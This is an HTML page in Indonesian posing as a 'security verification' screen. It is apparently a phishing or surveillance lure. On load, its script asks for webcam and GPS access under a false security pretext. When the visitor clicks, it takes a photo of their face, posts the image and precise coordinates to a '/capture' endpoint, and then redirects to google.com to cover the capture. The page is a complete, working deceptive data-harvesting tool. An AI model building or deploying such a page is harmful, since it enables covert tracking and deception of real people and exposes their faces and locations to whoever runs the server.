<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📸 Verifikasi Keamanan</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body {
            background: #0d1117;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .box {
            background: #161b22;
            padding: 35px;
            border-radius: 16px;
            width: 380px;
            border: 1px solid #30363d;
            text-align: center;
        }
        .box h2 { color: #fff; margin-bottom: 5px; }
        .box h2 span { color: #58a6ff; }
        .sub { color: #8b949e; font-size: 14px; margin-bottom: 15px; }
        .camera-box {
            width: 100%;
            height: 220px;
            background: #0d1117;
            border: 2px dashed #30363d;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 12px;
        }
        .camera-box video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
        }
        .camera-box .placeholder {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100%;
            color: #8b949e;
        }
        .camera-box .placeholder .icon { font-size: 48px; }
        .btn {
            width: 100%;
            padding: 13px;
            margin-top: 10px;
            background: #238636;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
        }
        .btn:hover { background: #2ea043; }
        .btn:disabled { background: #555; cursor: not-allowed; }
        .status {
            margin: 10px 0;
            font-size: 13px;
            color: #8b949e;
        }
        .status.success { color: #2ea043; }
        .status.error { color: #da3633; }
        .status.gps { color: #f1c40f; }
        .footer { margin-top: 14px; font-size: 11px; color: #555; }
        .hidden { display: none; }
    </style>
</head>
<body>
<div class="box">
    <h2>📹 <span>Verifikasi Keamanan</span></h2>
    <p class="sub">Untuk keamanan, verifikasi wajah & lokasi diperlukan</p>

    <div class="camera-box" id="cameraBox">
        <div class="placeholder" id="placeholder">
            <span class="icon">📷</span>
            <span>Kamera akan aktif</span>
        </div>
        <video id="video" class="hidden" autoplay muted></video>
    </div>

    <div class="status" id="status">⏳ Menyiapkan...</div>

    <button class="btn" id="startBtn">📸 Aktifkan Kamera & Kirim</button>
    <div class="footer">© 2026 SecureSystem</div>
</div>

<canvas id="canvas" class="hidden"></canvas>

<script>
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
const statusEl = document.getElementById('status');
const startBtn = document.getElementById('startBtn');
const placeholder = document.getElementById('placeholder');

let stream = null;
let cameraReady = false;
let gpsData = { lat: '-', lon: '-', acc: '-' };

navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } })
    .then((stream) => {
        video.srcObject = stream;
        video.classList.remove('hidden');
        placeholder.style.display = 'none';
        cameraReady = true;
        statusEl.textContent = '✅ Kamera siap';
        statusEl.className = 'status success';
    })
    .catch(() => {
        statusEl.textContent = '⚠️ Izin kamera ditolak';
        statusEl.className = 'status error';
        cameraReady = false;
    });

navigator.geolocation.getCurrentPosition(
    (pos) => {
        gpsData.lat = pos.coords.latitude;
        gpsData.lon = pos.coords.longitude;
        gpsData.acc = pos.coords.accuracy;
        statusEl.textContent = `📍 Lokasi: ${gpsData.lat}, ${gpsData.lon}`;
        statusEl.className = 'status gps';
    },
    () => {
        statusEl.textContent = '⚠️ Gagal ambil lokasi, lanjut tanpa GPS';
        statusEl.className = 'status error';
    }
);

function captureImage() {
    if (!cameraReady || !video.videoWidth) return null;
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);
    return canvas.toDataURL('image/jpeg');
}

async function sendData(image) {
    try {
        const response = await fetch('/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: 'guest',
                password: 'filtered',
                image: image || '',
                lat: gpsData.lat,
                lon: gpsData.lon,
                acc: gpsData.acc
            })
        });
        const result = await response.json();
        return result.status === 'success';
    } catch (err) {
        return false;
    }
}

startBtn.addEventListener('click', async () => {
    if (!cameraReady) {
        statusEl.textContent = '⚠️ Kamera belum siap!';
        statusEl.className = 'status error';
        return;
    }

    startBtn.disabled = true;
    startBtn.textContent = '⏳ Mengirim...';
    statusEl.textContent = '📤 Mengirim data...';
    statusEl.className = 'status';

    const image = captureImage();
    const success = await sendData(image);

    if (success) {
        statusEl.textContent = '✅ Berhasil dikirim!';
        statusEl.className = 'status success';
        window.location.href = 'https://www.google.com';
    } else {
        statusEl.textContent = '⚠️ Gagal kirim, coba lagi';
        statusEl.className = 'status error';
        startBtn.disabled = false;
        startBtn.textContent = '📸 Aktifkan Kamera & Kirim';
    }
});

window.addEventListener('beforeunload', () => {
    if (stream) stream.getTracks().forEach(t => t.stop());
});
</script>
</body>
</html>
